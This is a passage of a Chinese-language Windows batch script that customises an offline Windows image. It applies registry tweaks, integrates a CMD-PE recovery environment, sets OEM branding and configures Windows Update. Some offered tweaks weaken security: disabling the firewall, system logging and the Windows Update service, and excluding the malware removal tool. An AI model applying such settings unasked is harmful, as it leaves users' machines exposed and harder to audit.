echo.   ^|   优化文件系统（NTFS）的管理，缩短打开文件的反应时间 -                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭系统自动调试功能，提高系统运行速度 -                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   加大系统的图标缓冲，提高系统开机速度 -                               ^|
echo.   ^|                                                                        ^| 
echo.   ^|   禁止系统自动生成错误报告，加快系统反应速度 -                         ^|
echo.   ^|                                                                        ^| 
echo.   ^|   禁止U盘等移动设备的自动播放，防止被病毒感染 -                        ^|
echo.   ^|                                                                        ^| 
echo.   ^|   自动优化启动分区，加快启动速度 -                                     ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   ***网络优化***                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭默认共享                                                         ^|
if /i "!Version!"=="7" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   关闭防火墙                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭远程协助                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   启用最大传输单元大小自动探测、黑洞路由器探测，提高网速               ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化默认分组报文寿命，避免浪费流量，提高网速                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化网卡性能，提升网络效率                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化网络WINS名称查询时间，增强网络数据传输能力，提高网速             ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化网络参数设置，提高网络连接稳定性                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化网络快速转发机制，提高上网速度                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化局域网连接                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   优化DNS，加快DNS的解析速度                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   启动传输单元缓冲区自动调整，减少网络反应时间。电脑管家               ^|
echo.   ^|                                                                        ^|
echo.   ^|   ***其他优化***                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭允许网站通过访问我的语言列表来提供本地相关内容                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭反馈和诊断                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭收集语言和书写习惯                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   关闭windows跟踪应用启动                                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   反馈频率改为"从不"                                                   ^|
if  /i "!Version:~0,1!"=="8" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
if /i "!Version!"=="10" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   关闭传递优化                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   右键添加管理员取得所有权                                             ^|
if /i "!Version!"=="7" echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul && cls
echo.   ^|                                                                        ^|
echo.   ^|   去掉 WinRAR 在右键菜单中添加的"压缩...并 E-Mail"                     ^|
if /i "!Version!"=="10" (
echo.   ^|                                                                        ^|
echo.   ^|   禁止网易云音乐后台运行                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁止网易云音乐的应用通知                                             ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   记事本自动换行                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   记事本始终显示状态栏                                                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   用记事本打开NFO文件                                                  ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows Media Player不显示首次使用对话框                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   启用Windows 照片查看器                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   VHD启动时不要将VHD动态文件扩展到最大（以节省空间）                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁止蓝屏时自动重启                                                   ^|
if !Version! neq 7 (
echo.   ^|                                                                        ^|
echo.   ^|   关闭快速启动                                                         ^|
)
echo.   ^|                                                                        ^|
echo.   ^|   禁用系统日志                                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁用组件堆栈（Component Based Servicing）文件备份                    ^|
echo.   ^|                                                                        ^|
echo.   ^|   禁用WfpDiag.ETL日志                                                  ^|
echo.   ^|                                                                        ^|
echo. && echo. && echo.       以上是针对"Windows!Version!_x!Bit!"的优化项目，请按任意键继续... && pause>nul
set "AppPath=File\Reg\Windows!Version!.reg"
if /i "!Version!"=="10" (
	if !ReleaseId! gtr 1809 set "AppPath=File\Reg\Windows!Version!+.reg"
)
if exist "!AppPath!" (
	copy /v /y "!AppPath!" "Mount\Windows\System32\Windows!Version!.reg" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "majorization" /t REG_SZ /d "cmd.exe /c regedit /s \"C:\Windows\System32\Windows!Version!.reg\" && del /f /q \"C:\Windows\System32\Windows!Version!.reg\"" /f >nul 2>nul
	if /i "!Version!"=="7" (
		copy /v /y "File\Reg\Windows Explorer.lnk" "!Sysprep!" >nul 2>nul
		Reg.exe add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v "29" /t REG_SZ /d "C:\Windows\system32\imageres.dll,196" /f >nul 2>nul
		Reg.exe add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons" /v "77" /t REG_SZ /d "C:\Windows\system32\imageres.dll,196" /f >nul 2>nul
		Reg.exe add "HKCU\ZTM\Microsoft\Windows\CurrentVersion\Explorer" /v "Link" /t REG_BINARY /d "00000000" /f >nul 2>nul
		reg load HKLM\UEFI_NTUSER "Mount\Users\Default\ntuser.dat" >nul 2>nul	
		Reg.exe add "HKLM\UEFI_NTUSER\Software\Microsoft\CTF\LangBar" /v "ShowStatus" /t REG_DWORD /d "4" /f >nul 2>nul
		Reg.exe add "HKLM\UEFI_NTUSER\Software\Microsoft\CTF\LangBar" /v "ExtraIconsOnMinimized" /t REG_DWORD /d "0" /f >nul 2>nul
		Reg.exe add "HKLM\UEFI_NTUSER\Software\Microsoft\CTF\LangBar\ItemState\{ED9D5450-EBE6-4255-8289-F8A31E687228}" /v "DemoteLevel" /t REG_DWORD /d "3" /f >nul 2>nul
		taskkill /f /IM Dism++x64.exe >nul 2>nul
		taskkill /f /IM regedit.exe >nul 2>nul
		reg unload HKLM\UEFI_NTUSER >nul 2>nul	
	) else (
		copy /v /y "File\Reg\Blank.ico" "Mount\Windows" >nul 2>nul
	)
) else (
	call :AppPath
)
reg query "HKLM\ZTM\Microsoft\Windows\CurrentVersion\RunOnce" /v "majorization" >nul 2>nul && if exist "Mount\Windows\System32\Windows!Version!.reg" ( call :Log & call :Achiexe ) else ( call :Failure )

:input8
cls&mode con cols=80 lines=30&title 集成CMD-PE&set "Item=集成CMD-PE"
set "goto=menu3"
echo.
echo.    ______________________________ 集成CMD-PE ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   替换Windows RE为CMD-PE，如果系统安装失败，或系统出现问题无法正常启   ^|
echo.   ^|                                                                        ^|
echo.   ^|   动系统，可以进CMD-PE，可以上网，可以远程，可以下载，查看详情请按 G...^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 集成CMD-PE                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1GX /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :menu3
if errorlevel 2 (start http://cmdpe.com/post/8.html & goto :input8)
cls&&echo.&&echo.正在集成CMD-PE中，请稍等...
if exist "Mount\Windows\System32\Recovery" rd /s /q "Mount\Windows\System32\Recovery" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\cmdpe\cmdpe.7z" "cmdpe.exe" -o"Mount\Windows\System32\oobe" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\cmdpe\cmdpe.7z" "cmdpe.sdi" -o"Mount\Windows\System32\Recovery" >nul 2>nul
"!ToolsPath!\7z.exe" -y x "File\cmdpe\cmdpe.7z" "cmdpe.wim" -o"Mount\Windows\System32\Recovery" >nul 2>nul
reg load HKLM\CMDPE_SYSTEM "Mount\Windows\System32\config\SYSTEM" >nul 2>nul
Reg.exe add "HKLM\CMDPE_SYSTEM\Setup" /v "CmdLine" /t REG_SZ /d "oobe\cmdpe.exe" /f >nul 2>nul
taskkill /f /IM Dism++x64.exe >nul 2>nul
taskkill /f /IM regedit.exe >nul 2>nul
reg unload HKLM\CMDPE_SYSTEM >nul 2>nul
if exist "Mount\Windows\System32\Recovery\cmdpe.wim" ( call :Log & call :Achiexe ) else ( call :Failure )

:input9
cls&mode con cols=80 lines=30&title 开启 Compact_OS
set "Item=开启 Compact_OS"
set "goto=menu3"
echo.
echo.    ____________________________ 开启Compact_OS ____________________________
echo.   ^|                            ----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   开启Compact_OS(紧凑型操作系统)，只支持Windows 10，开启后好处是系统   ^|
echo.   ^|                                                                        ^|
echo.   ^|   安装完占用更小的磁盘空间，坏处是会增加系统安装时间。                 ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 开启Compact OS                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 2 goto :menu3
if errorlevel 1 goto :CompactOS 

:CompactOS 
cls
if /i "!Version!"=="10" (
	echo Compact.exe /CompactOS:always > "!ScriptsLog!\CompactOS.log"
	if exist "!ScriptsLog!\CompactOS.log" ( call :Log & call :Achiexe ) else ( call :Failure )
) else (
	echo. && echo.挂载的系统是Windows!Version!，该功能只支持Windows 10，请按任意键返回... && pause>nul && goto :menu3
)

:input10
cls&mode con cols=80 lines=30&title OEM信息设置
set "Item="
set "goto=input10"
echo.
echo.    _____________________________ OEM信息设置 ______________________________
echo.   ^|                             -------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   如果不知道OEM信息是什么，查看详情请按 G...                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 制造商                                                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 型号                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 网站                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 图标                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] 壁纸                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12345GX /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 7 goto :menu3
if errorlevel 6 (start http://www.cmdpe.com/zb_users/theme/HTML5CSS3/style/images/OEM.jpg & goto :input10)
if errorlevel 5 goto :Wallpaper
if errorlevel 4 goto :Oemlogo
if errorlevel 3 goto :SupportURL
if errorlevel 2 goto :Model
if errorlevel 1 goto :Manufacturer

:Manufacturer
cls&title OEM制造商设置&set "Manufacturer="
echo.
echo.    _____________________________ OEM制造商设置 ____________________________
echo.   ^|                             ---------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入OEM标题然后回车，如需返回输入 X 然后回车。         ^|
echo.   ^|                                                                        ^|
echo.
set /p Manufacturer=^>^>^>^>^>^>^>请输入:
if not defined Manufacturer cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :Manufacturer
if /i "!Manufacturer: =!" equ "" cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :Manufacturer
if /i "!Manufacturer!" equ "x" goto :input10
set "Item=设置OEM制造商为!Manufacturer!"
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "Manufacturer" /t REG_SZ /d "!Manufacturer!" /f >nul 2>nul
call :Log & call :Achiexe

:Model
cls&title OEM型号设置&set "Model="
echo.
echo.    ______________________________ OEM型号设置 _____________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入OEM型号然后回车，如需返回输入 X 然后回车。         ^|
echo.   ^|                                                                        ^|
echo.
set /p Model=^>^>^>^>^>^>^>请输入:
if not defined Model cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :Manufacturer
if /i "!Model: =!" equ "" cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :Manufacturer
if /i "!Model!" equ "x" goto :input10
set "Item=设置OEM制造商为!Model!"
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "Model" /t REG_SZ /d "!Model!" /f >nul 2>nul
call :Log & call :Achiexe

:SupportURL
cls&title OEM网站设置&set "SupportURL="
echo.
echo.    ______________________________ OEM网站设置 _____________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入OEM网址然后回车，如需返回输入 X 然后回车。         ^|
echo.   ^|                                                                        ^|
echo.
set /p SupportURL=^>^>^>^>^>^>^>请输入:
if not defined SupportURL cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :SupportURL
if /i "!SupportURL: =!" equ "" cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :SupportURL
if /i "!SupportURL!" equ "x" goto :input10
set "Item=设置OEM网站为!SupportURL!"
reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "SupportURL" /t REG_SZ /d "!SupportURL!" /f >nul 2>nul
call :Log & call :Achiexe

:Oemlogo
cls&title OEM图标设置&set "Item=设置OEM图标"
echo.
echo.    ______________________________ OEM图标设置 _____________________________
echo.   ^|                              -------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴.bmp格式图标源文件的完整路径然后回车。       ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
echo.
set /p LogoPath=^>^>^>^>^>^>^>请输入:
if not defined LogoPath cls&&echo.&&echo.您的输入为空，请按任意键返回重新输入......&&pause>nul&&goto :Oemlogo
set "LogoPath=!LogoPath:"=!"
if /i "!LogoPath!" equ "x" goto :input10
if "%LogoPath:~-4%" neq ".bmp" (cls&&echo.&&echo.您的输入格式不正确，请按任意键返回重新输入...&&pause>nul&&goto :Oemlogo)
if exist "!LogoPath!" (
	copy /v /y "!LogoPath!" "Mount\Windows\System32\OEM.bmp" >nul 2>nul
	reg add "HKLM\ZTM\Microsoft\Windows\CurrentVersion\OEMInformation" /v "logo" /t REG_SZ /d "OEM.bmp" /f >nul 2>nul
) else ( 
	cls && echo. && echo.您的输入格式不正确，请按任意键返回重新输入... && pause>nul && goto :input10 
)
call :Log & call :Achiexe

:Wallpaper
cls&title 桌面壁纸设置&set "Item=桌面壁纸设置"
echo.
echo.    _____________________________ 桌面壁纸设置 _____________________________
echo.   ^|                             --------------                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入或粘贴.jpg格式图片源文件的完整路径然后回车。       ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
echo.
set /p Wallpaper=^>^>^>^>^>^>^>请输入:
if not defined Wallpaper cls&&echo.&&echo.您的输入为空，请按任意键返回重新输入......&&pause>nul&&goto :Oemlogo
set "Wallpaper=!Wallpaper:"=!"
if /i "!Wallpaper!" equ "x" goto :input10
if /i "%Wallpaper:~-4%" neq ".jpg" (cls&&echo.&&echo.您的输入格式不正确，请按任意键返回重新输入...&&pause>nul&&goto :Oemlogo)
if exist "!Wallpaper!" (
	copy /v /y "!Wallpaper!" "Mount\Windows\Web\Wallpaper\OEM.jpg" >nul 2>nul
	copy /v /y "File\Bin\x64\PECMD.EXE" "Mount\Windows\Sysprep\PECMD.EXE" >nul 2>nul
	echo %%Windir%%\Sysprep\PECMD.EXE Wall C:\Windows\web\wallpaper\OEM.jpg > "!ScriptsLog!\Wallpaper.log"
	echo del /f /q %%Windir%%\Sysprep\PECMD.EXE >> "!ScriptsLog!\Wallpaper.log"
	REM taskkill /f /im dism++x64.exe >nul 2>nul
	REM taskkill /f /im regedit.exe >nul 2>nul
	REM reg load HKLM\ZTM_DEFAULT "Mount\Windows\System32\config\DEFAULT" >nul 2>nul
	REM reg add "HKLM\ZTM_DEFAULT\Control Panel\Desktop" /v "WallPaper" /t REG_SZ /d "C:\Windows\web\wallpaper\OEM.jpg" /f >nul 2>nul
	REM reg unload HKLM\ZTM_DEFAULT >nul 2>nul
	REM copy /v /y "!Wallpaper!" "Mount\Windows\Web\Wallpaper\OEM.jpg" >nul 2>nul
	REM echo reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v "WallPaper" /t REG_SZ /d "C:\Windows\web\wallpaper\OEM.jpg" /f > "!ScriptsLog!\Wallpaper.log"
) else ( 
	cls && echo. && echo.您的输入格式不正确，请按任意键返回重新输入... && pause>nul && goto :input10 
)
if exist "!ScriptsLog!\Wallpaper.log" ( call :Log & call :Achiexe ) else ( call :Failure )
REM call :Log & call :Achiexe

:input11
cls&mode con cols=80 lines=30&title IE主页设置
set "Item="
set "goto=menu3"
echo.
echo.    ______________________________ IE主页设置 ______________________________
echo.   ^|                              ------------                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下行光标处输入IE浏览器主页网址，然后回车。                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需返回输入 X 然后回车。                                            ^|
echo.   ^|                                                                        ^|
echo.
set "IeHome="
set /p IeHome=^>^>^>^>^>^>^>请输入：
if not defined IeHome cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :input11
if /i "!IeHome: =!" equ "" cls && echo. && echo.您的输入为空，请按任意键返回重新输入... && pause>nul && goto :input11
if /i "!IeHome!" equ "x" goto :menu3
set "Item=设置IE主页为!IeHome!"
echo reg add "HKCU\Software\Microsoft\Internet Explorer\Main" /v "Start Page" /t REG_SZ /d "!IeHome!" /f > "!ScriptsLog!\IeHome.log"
if exist "!ScriptsLog!\IeHome.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input12
cls&mode con cols=80 lines=30&title Windows更新设置
set "Item="
set "goto=input12"
echo.
echo.    ___________________________ Windows更新设置 ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   如需彻底禁用Windows Update更新功能，直接设置选项[6]即可...           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 是否自动安装无需重启的更新                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 更新挂起时如果有用户登录是否自动重启计算机                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] Windows更新是否包括驱动程序（仅针对Windows10）                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] Windows更新是否包括恶意软件删除工具                              ^|
echo.   ^|                                                                        ^|
echo.   ^|   [5] 将Windows更新调整为...                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [6] 禁用或启用Windows更新服务                                        ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:123456X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 7 goto :menu3
if errorlevel 6 goto :UpdateSet6
if errorlevel 5 goto :UpdateSet5
if errorlevel 4 goto :UpdateSet4
if errorlevel 3 goto :UpdateSet3
if errorlevel 2 goto :UpdateSet2
if errorlevel 1 goto :UpdateSet1

:UpdateSet1
cls
echo.
echo.    ___________________________ Windows更新设置 ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   是否自动安装无需重启的更新？                                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 是                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 不                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=不自动安装无需重启的更新-设置" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AutoInstallMinorUpdates" /t REG_DWORD /d "0" /f >nul 2>nul)
if errorlevel 1 (set "Item=自动安装无需重启的更新-设置" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AutoInstallMinorUpdates" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet2
cls
echo.
echo.    ___________________________ Windows更新设置 ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   更新挂起时如果有用户登录是否自动重启计算机？                         ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 不                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 是                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=更新挂起时如果有用户登录自动重启计算机-设置" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d "0" /f >nul 2>nul)
if errorlevel 1 (set "Item=更新挂起时如果有用户登录不自动重启计算机-设置" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoRebootWithLoggedOnUsers" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe
:UpdateSet3
cls
if /i not "!Version!"=="10" (cls && echo. && echo.此项至针对Windows10，已挂载的系统是Windows!Version!，请按任意键返回... && pause>nul && goto :input12)
echo.
echo.    ___________________________ Windows更新设置 ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows更新是否包括驱动程序？(仅正对Windows10)                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 不                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 是                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择:
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=Windows更新包括驱动程序-设置" & Reg delete "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate" /v "ExcludeWUDriversInQualityUpdate" /f >nul 2>nul & Reg ADD "HKLM\ZTM\Microsoft\Windows\CurrentVersion\DriverSearching" /v SearchOrderConfig /t REG_DWORD /d 1 /f >nul 2>nul)
if errorlevel 1 (set "Item=Windows更新不包括驱动程序-设置" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate" /v "ExcludeWUDriversInQualityUpdate" /t REG_DWORD /d "1" /f >nul 2>nul & Reg ADD "HKLM\ZTM\Microsoft\Windows\CurrentVersion\DriverSearching" /v SearchOrderConfig /t REG_DWORD /d 0 /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet4
cls
echo.
echo.    ___________________________ Windows更新设置 ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   Windows更新是否包括恶意软件删除工具？                                ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 不                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 是                                                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :input12
if errorlevel 2 (set "Item=Windows更新包括恶意软件删除工具-设置" & Reg delete "HKLM\ZTM\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /f >nul 2>nul)
if errorlevel 1 (set "Item=Windows更新不包括恶意软件删除工具-设置" & Reg add "HKLM\ZTM\Policies\Microsoft\MRT" /v "DontOfferThroughWUAU" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet5
cls
echo.
echo.    ___________________________ Windows更新设置 ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   将Windows更新调整为...                                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 从不检查更新                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 仅检查更新                                                       ^|
echo.   ^|                                                                        ^|
echo.   ^|   [3] 检查并下载更新                                                   ^|
echo.   ^|                                                                        ^|
echo.   ^|   [4] 自动安装更新（默认）                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:1234X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 5 goto :input12
if errorlevel 4 (set "Item=将Windows更新调整为-自动安装更新" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "4" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "0" /f >nul 2>nul)
if errorlevel 3 (set "Item=将Windows更新调整为-检查并下载更新" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "3" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul 2>nul)
if errorlevel 2 (set "Item=将Windows更新调整为-仅检查更新" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "2" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul 2>nul)
if errorlevel 1 (set "Item=将Windows更新调整为-从不检查更新" & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "AUOptions" /t REG_DWORD /d "1" /f & Reg add "HKLM\ZTM\Policies\Microsoft\Windows\WindowsUpdate\AU" /v "NoAutoUpdate" /t REG_DWORD /d "1" /f >nul 2>nul)
call :Log & call :Achiexe

:UpdateSet6
cls
echo.
echo.    ___________________________ Windows更新设置 ____________________________
echo.   ^|                           -----------------                            ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[1]:将彻底禁用Windows Update更新服务。                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   选项[2]:将重新启用Windows Update更新服务。                           ^|
echo.   ^|                                                                        ^|
echo.   ^|   [1] 禁用                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|   [2] 启用（默认）                                                     ^|
echo.   ^|                                                                        ^|
echo.   ^|   [X] 返回                                                             ^|
echo.   ^|                                                                        ^|
echo.   ^|________________________________________________________________________^|
echo.
choice /c:12X /n /m ^>^>^>^>^>^>^>请输入选择: 
if errorlevel 3 goto :input12
if errorlevel 2 goto :StartUpdate
if errorlevel 1 goto :StopUpdate

:StopUpdate
cls
set "Item=禁用Windows更新服务"
echo sc config wuauserv start= disabled > "!ScriptsLog!\Update.log"
echo sc stop wuauserv >> "!ScriptsLog!\Update.log"
if exist "!ScriptsLog!\Update.log" ( call :Log & call :Achiexe ) else ( call :Failure )
:StartUpdate
cls
set "Item=启用Windows更新服务"
if exist "!ScriptsLog!\Update.log" del /f /q "!ScriptsLog!\Update.log"
if not exist "!ScriptsLog!\Update.log" ( call :Log & call :Achiexe ) else ( call :Failure )

:input13
cls&mode con cols=80 lines=30&title 关闭Windows服务
set "Item="
set "goto=input13"
echo.
echo.    _______________________________ 关闭服务 _______________________________
echo.   ^|                               ----------                               ^|
echo.   ^|                                                                        ^|
echo.   ^|   此项你可以关闭Windows任何服务，如需了解如何查看服务名称请按 G...     ^|
echo.   ^|                                                                        ^|
echo.   ^|   请在下面光标处输入你要关闭的服务名称，然后回车。一次只可输入一个     ^|
echo.   ^|                                                                        ^|
echo.   ^|   服务名称，如需关闭多个服务，请多次输入，请勿输入标点符号与特殊符号。 ^|
echo.   ^|                                                                        ^|
echo.   ^|   返回请输入 X 然后回车。                                              ^|
echo.   ^|                                                                        ^|
echo.
set "Serving="
set /p Serving=^>^>^>^>^>^>^>请输入：
if not defined Serving cls && echo. && echo.您的输入"!Serving!"为空，请按任意键返回... && pause>nul && goto :input13
set "Serving=!Serving:"=!"
if not defined Serving cls&&echo.&&echo.您的输入"!Serving!"格式不正确，请按任意键返回重新输入... && pause>nul&&goto :input13
if /i "!Serving!" equ "g" ( start http://cmdpe.com/post/9.html & goto :input13 )
if /i "!Serving!" equ "x" goto :menu3
